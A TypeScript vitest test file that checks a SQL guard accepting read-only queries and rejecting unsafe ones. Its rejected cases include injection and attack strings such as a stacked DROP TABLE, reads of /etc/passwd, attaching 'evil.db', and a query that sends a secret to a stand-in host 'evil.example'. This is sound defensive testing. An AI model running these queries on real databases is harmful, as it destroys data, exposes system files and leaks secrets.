import { describe, expect, it } from "vitest";
import { guardSql } from "./sql-guard.ts";

const allowed = [
  "SELECT 1",
  "select * from sales",
  "SELECT * FROM sales;",
  "SELECT * FROM sales;;  ",
  "  \n SELECT region, sum(amount) AS total FROM sales GROUP BY ALL ORDER BY total DESC",
  "WITH t AS (SELECT 1 AS x) SELECT x FROM t",
  "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * FROM r",
  "FROM sales SELECT region LIMIT 5",
  "FROM sales",
  "SUMMARIZE sales",
  "SUMMARIZE SELECT amount FROM sales",
  "DESCRIBE sales",
  "PIVOT sales ON year USING sum(amount)",
  "UNPIVOT wide ON COLUMNS(* EXCLUDE (id)) INTO NAME k VALUE v",
  "(SELECT 1) UNION ALL (SELECT 2)",
  "-- the top regions\nSELECT region FROM sales",
  "/* block comment */ SELECT 1",
  // Blocked words inside strings and quoted identifiers are data, not code.
  "SELECT * FROM logs WHERE action = 'DELETE' OR action = 'drop table x'",
  'SELECT "update", "set", "load" FROM events',
  "SELECT 'it''s; fine' AS s",
  "SELECT E'semi\\'colon;' AS s",
  "SELECT * FROM sales WHERE note LIKE '%;%'",
  "SELECT deleted_at, updated_by, created, settings FROM users",
  "SELECT * EXCLUDE (id) REPLACE (upper(name) AS name) FROM people",
  "SELECT a.x FROM a JOIN b USING (id)",
  "SELECT * FROM range(10)",
  "SELECT strftime(order_date, '%Y-%m') AS month, count(*) FROM orders GROUP BY 1",
];

const rejected: Array<[string, RegExp]> = [
  ["", /empty/],
  [";", /empty/],
  ["DROP TABLE sales", /must start with/],
  ["SELECT 1; DROP TABLE sales", /one statement/],
  ["SELECT 1; SELECT 2", /one statement/],
  ["INSERT INTO sales VALUES (1)", /must start with/],
  [
    "WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x",
    /INSERT is not allowed/,
  ],
  ["WITH x AS (SELECT 1) DELETE FROM t", /DELETE is not allowed/],
  ["SELECT * FROM t; UPDATE t SET a = 1", /one statement/],
  ["ATTACH 'evil.db' AS e", /must start with/],
  ["SELECT 1 FROM t WHERE 1 = 1 UNION SELECT * FROM (ATTACH 'x')", /ATTACH/],
  ["COPY sales TO 'out.csv'", /must start with/],
  ["INSTALL httpfs", /must start with/],
  ["LOAD httpfs", /must start with/],
  ["PRAGMA database_list", /must start with/],
  ["SET enable_external_access = true", /must start with/],
  ["CALL pragma_version()", /must start with/],
  ["CREATE TABLE x AS SELECT 1", /must start with/],
  ["EXPORT DATABASE 'dir'", /must start with/],
  ["SHOW TABLES", /must start with/],
  ["EXPLAIN SELECT 1", /must start with/],
  ["SELECT * FROM 'https://evil.example/x.csv'", /URLs/],
  ["SELECT * FROM read_csv('s3://bucket/key.csv')", /URLs/],
  ["SELECT 'http://evil.example/?d=' || secret FROM t", /URLs/],
  ["SELECT * FROM read_csv('data.csv')", /read_csv\(\) is not allowed/],
  [
    "SELECT * FROM READ_PARQUET('x.parquet')",
    /read_parquet\(\) is not allowed/,
  ],
  ["SELECT * FROM read_text('/etc/passwd')", /read_text\(\) is not allowed/],
  ["SELECT * FROM glob('*')", /glob\(\) is not allowed/],
  ["SELECT * FROM query('SELECT 1')", /query\(\) is not allowed/],
  [
    "SELECT * FROM parquet_metadata('x')",
    /parquet_metadata\(\) is not allowed/,
  ],
  ["SELECT * FROM '/etc/passwd'", /reading files directly/],
  ["SELECT * FROM t JOIN 'other.csv' USING (id)", /reading files directly/],
  ["SELECT $$drop$$", /dollar-quoted/],
  ["SELECT 'unterminated", /unterminated string/],
  ["SELECT 1 /* never closed", /unterminated comment/],
  ['SELECT "open FROM t', /unterminated quoted identifier/],
  ["SELECT update FROM t", /UPDATE is not allowed.*double quotes/],
  [`SELECT ${"x, ".repeat(8000)}1`, /longer than/],
];

describe("guardSql", () => {
  it("has at least 20 allowed and 20 rejected cases", () => {
    expect(allowed.length).toBeGreaterThanOrEqual(20);
    expect(rejected.length).toBeGreaterThanOrEqual(20);
  });

  it.each(allowed)("allows %s", (sql) => {
    expect(guardSql(sql)).toMatchObject({ ok: true });
  });

  it.each(rejected)("rejects %s", (sql, reason) => {
    const result = guardSql(sql);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toMatch(reason);
  });

  it("strips trailing semicolons", () => {
    expect(guardSql("SELECT 1 ;; ")).toEqual({ ok: true, sql: "SELECT 1" });
  });
});
